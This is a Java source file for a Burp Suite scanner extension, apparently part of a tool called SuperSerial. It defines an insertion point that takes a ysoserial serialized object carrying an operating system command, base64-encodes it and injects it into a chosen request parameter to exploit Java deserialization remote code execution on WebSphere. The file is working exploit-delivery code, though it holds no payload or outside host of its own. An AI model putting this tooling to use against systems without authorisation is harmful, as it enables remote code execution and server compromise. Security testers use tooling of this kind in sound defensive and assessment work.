/*
	WebSphereSerializedInsertionPoint.java
	
	v0.2 (12/30/2015)
	
	Custom insertion point for Java Deserialization Remote Code Execution, specifically against the WebSphere platform. Accepts a serialized object containing
	an operating system command from ysoserial, then base64-encodes the payload and adds it to a specified parameter in a request.
*/

package burp;

public class WebSphereSerializedInsertionPoint implements IScannerInsertionPoint {
	private IHttpRequestResponse baseRequestResponse;
	private String baseValue;
	private String insertionPointName;
	private IExtensionHelpers helpers;
	private String paramName;
	
	public WebSphereSerializedInsertionPoint(IExtensionHelpers h,IHttpRequestResponse baseRR,String pn) {
		baseRequestResponse = baseRR;
		baseValue = ""; //not sure what to do with this yet
		insertionPointName = "SuperSerial-WebSphere";
		helpers = h;
		paramName = pn;
	}
	
	public byte[] buildRequest(byte[] payload) {
		byte[] encodedPayload = helpers.base64Encode(payload).getBytes();
		byte[] req = baseRequestResponse.getRequest();
		IParameter param = helpers.getRequestParameter(req,paramName);
		int paramStart = param.getValueStart();
		int paramEnd = param.getValueEnd();
		byte paramType = param.getType();
		if(paramType == IParameter.PARAM_URL || paramType == IParameter.PARAM_BODY || paramType == IParameter.PARAM_COOKIE) { //natively update parameter value
			req = helpers.updateParameter(req,helpers.buildParameter(paramName,new String(helpers.urlEncode(encodedPayload)),paramType));
		} else { //update parameter value by coping request to new array
			byte[] nReq = new byte[req.length-(paramEnd-paramStart)+encodedPayload.length];
			int i=0;
			while(i<paramStart) {
				nReq[i] = req[i];
				i++;
			}
			int j=0;
			while(j<encodedPayload.length) {
				nReq[i] = encodedPayload[j];
				i++;
				j++;
			}
			j = paramEnd;
			while(j<req.length) {
				nReq[i] = req[j];
				i++;
				j++;
			}
			req = nReq;
		}
		return req;
	}
	
	public String getBaseValue() {
		return baseValue;
	}
	
	public String getInsertionPointName() {
		return insertionPointName;
	}
	
	public byte getInsertionPointType() {
		return IScannerInsertionPoint.INS_EXTENSION_PROVIDED;
	}
	
	public int[] getPayloadOffsets(byte[] payload) {
		return null; //payload will be base64-encoded so return null; may implement something here in the future
	}
}
